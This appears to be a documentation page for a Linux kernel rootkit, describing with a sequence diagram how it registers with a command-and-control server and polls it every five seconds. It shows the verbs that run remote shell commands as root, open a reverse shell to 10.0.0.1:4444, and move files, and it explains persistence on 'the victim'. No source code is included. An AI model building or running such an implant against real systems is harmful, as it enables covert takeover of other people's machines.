---
title: Connection & Polling
description: How the rootkit registers with the C2 and polls for commands.
---

On load, the rootkit registers with the C2 server and spawns a polling thread that fetches commands every 5 seconds.

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 740 860" style="width:100%;max-width:740px;display:block;margin:1.5rem auto;font-family:monospace;">
  <defs>
    <marker id="c-arr-r" markerWidth="8" markerHeight="6" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 z" fill="#60a5fa"/></marker>
    <marker id="c-arr-l" markerWidth="8" markerHeight="6" refX="0" refY="3" orient="auto"><path d="M6,0 L0,3 L6,6 z" fill="#94a3b8"/></marker>
    <marker id="c-arr-r-red" markerWidth="8" markerHeight="6" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 z" fill="#f87171"/></marker>
  </defs>
  <rect x="30" y="10" width="170" height="36" rx="5" fill="#0f172a" stroke="#f87171" stroke-width="1.5"/>
  <text x="115" y="33" text-anchor="middle" fill="#fca5a5" font-size="11" font-weight="bold">wlkom.ko (rootkit)</text>
  <rect x="540" y="10" width="170" height="36" rx="5" fill="#0f172a" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="625" y="33" text-anchor="middle" fill="#93c5fd" font-size="11" font-weight="bold">C2 Server</text>
  <line x1="115" y1="46" x2="115" y2="840" stroke="#334155" stroke-width="1.5" stroke-dasharray="6,4"/>
  <line x1="625" y1="46" x2="625" y2="840" stroke="#334155" stroke-width="1.5" stroke-dasharray="6,4"/>
  <rect x="48" y="58" width="134" height="22" rx="3" fill="#1e293b" stroke="#475569" stroke-width="1"/>
  <text x="115" y="73" text-anchor="middle" fill="#ffffff" font-size="9">module loads</text>
  <line x1="115" y1="104" x2="622" y2="104" stroke="#60a5fa" stroke-width="1.5" marker-end="url(#c-arr-r)"/>
  <text x="370" y="97" text-anchor="middle" fill="#93c5fd" font-size="10">GET /register</text>
  <line x1="625" y1="122" x2="118" y2="122" stroke="#94a3b8" stroke-width="1" stroke-dasharray="4,3" marker-end="url(#c-arr-l)"/>
  <text x="370" y="136" text-anchor="middle" fill="#94a3b8" font-size="9">200  c4f92f82-d98d-45f5-9e1e-6b7cd97e2354</text>
  <rect x="35" y="148" width="160" height="20" rx="3" fill="#1e293b" stroke="#475569" stroke-width="1"/>
  <text x="115" y="162" text-anchor="middle" fill="#ffffff" font-size="9">saved to /rootkit/uuid</text>
  <rect x="35" y="186" width="160" height="20" rx="3" fill="#1e293b" stroke="#475569" stroke-width="1"/>
  <text x="115" y="200" text-anchor="middle" fill="#ffffff" font-size="9">kthread spawned</text>
  <line x1="115" y1="226" x2="622" y2="226" stroke="#60a5fa" stroke-width="1.5" marker-end="url(#c-arr-r)"/>
  <text x="370" y="219" text-anchor="middle" fill="#93c5fd" font-size="10">GET /api/&lt;uuid&gt;/action</text>
  <line x1="625" y1="244" x2="118" y2="244" stroke="#94a3b8" stroke-width="1" stroke-dasharray="4,3" marker-end="url(#c-arr-l)"/>
  <text x="370" y="258" text-anchor="middle" fill="#94a3b8" font-size="9">204 No Content -- no pending action</text>
  <rect x="72" y="268" width="86" height="15" rx="2" fill="#ffffff"/><text x="115" y="280" text-anchor="middle" fill="#1e293b" font-size="10">sleep 5s</text>
  <line x1="115" y1="300" x2="622" y2="300" stroke="#60a5fa" stroke-width="1.5" marker-end="url(#c-arr-r)"/>
  <text x="370" y="293" text-anchor="middle" fill="#93c5fd" font-size="10">GET /api/&lt;uuid&gt;/action</text>
  <line x1="625" y1="318" x2="118" y2="318" stroke="#94a3b8" stroke-width="1" stroke-dasharray="4,3" marker-end="url(#c-arr-l)"/>
  <text x="370" y="332" text-anchor="middle" fill="#94a3b8" font-size="9">204 No Content -- no pending action</text>
  <rect x="72" y="342" width="86" height="15" rx="2" fill="#ffffff"/><text x="115" y="354" text-anchor="middle" fill="#1e293b" font-size="10">sleep 5s</text>
  <line x1="115" y1="374" x2="622" y2="374" stroke="#60a5fa" stroke-width="1.5" marker-end="url(#c-arr-r)"/>
  <text x="370" y="367" text-anchor="middle" fill="#93c5fd" font-size="10">GET /api/&lt;uuid&gt;/action</text>
  <line x1="625" y1="392" x2="118" y2="392" stroke="#94a3b8" stroke-width="1" stroke-dasharray="4,3" marker-end="url(#c-arr-l)"/>
  <text x="370" y="406" text-anchor="middle" fill="#4ade80" font-size="10" font-weight="bold">200  exec:whoami</text>
  <text x="370" y="420" text-anchor="middle" fill="#94a3b8" font-size="8">format: verb:args -- verbs: exec, shell, eshell, upload, download</text>
  <rect x="35" y="434" width="160" height="20" rx="3" fill="#1e293b" stroke="#475569" stroke-width="1"/>
  <text x="115" y="448" text-anchor="middle" fill="#ffffff" font-size="9">/bin/sh -c "whoami"</text>
  <line x1="115" y1="472" x2="622" y2="472" stroke="#f87171" stroke-width="1.5" marker-end="url(#c-arr-r-red)"/>
  <text x="370" y="465" text-anchor="middle" fill="#fca5a5" font-size="10">POST /api/&lt;uuid&gt;/result</text>
  <text x="370" y="486" text-anchor="middle" fill="#94a3b8" font-size="8">exit_code=0  stdout=root  stderr=</text>
  <line x1="625" y1="502" x2="118" y2="502" stroke="#94a3b8" stroke-width="1" stroke-dasharray="4,3" marker-end="url(#c-arr-l)"/>
  <text x="370" y="516" text-anchor="middle" fill="#94a3b8" font-size="9">200 OK</text>
  <rect x="72" y="526" width="86" height="15" rx="2" fill="#ffffff"/><text x="115" y="538" text-anchor="middle" fill="#1e293b" font-size="10">sleep 5s</text>
  <line x1="115" y1="558" x2="622" y2="558" stroke="#60a5fa" stroke-width="1.5" marker-end="url(#c-arr-r)"/>
  <text x="370" y="551" text-anchor="middle" fill="#93c5fd" font-size="10">GET /api/&lt;uuid&gt;/action</text>
  <line x1="625" y1="576" x2="118" y2="576" stroke="#94a3b8" stroke-width="1" stroke-dasharray="4,3" marker-end="url(#c-arr-l)"/>
  <text x="370" y="590" text-anchor="middle" fill="#4ade80" font-size="10" font-weight="bold">200  shell:10.0.0.1,4444</text>
  <text x="370" y="604" text-anchor="middle" fill="#94a3b8" font-size="8">format: verb:ip,port</text>
  <rect x="35" y="618" width="160" height="20" rx="3" fill="#1e293b" stroke="#475569" stroke-width="1"/>
  <text x="115" y="632" text-anchor="middle" fill="#ffffff" font-size="9">spawn reverse shell</text>
  <rect x="72" y="644" width="86" height="15" rx="2" fill="#ffffff"/><text x="115" y="656" text-anchor="middle" fill="#1e293b" font-size="10">sleep 5s</text>
  <line x1="115" y1="668" x2="115" y2="820" stroke="#334155" stroke-width="1.5" stroke-dasharray="4,3"/>
  <line x1="625" y1="668" x2="625" y2="820" stroke="#334155" stroke-width="1.5" stroke-dasharray="4,3"/>
  <text x="370" y="840" text-anchor="middle" fill="#64748b" font-size="9">loop continues until system shutdown</text>
</svg>

The UUID returned by `/register` is persisted in `/rootkit/uuid` on the victim. On subsequent loads, registration is skipped and the existing UUID is reused.

If the C2 server is unreachable at load time, `insmod` still succeeds. The polling thread retries registration every 5 seconds in the background until the server responds, then switches to normal polling.

This also covers late network availability: if `systemd-modules-load` starts before the network interface is up, the polling thread retries registration in the background until it succeeds.
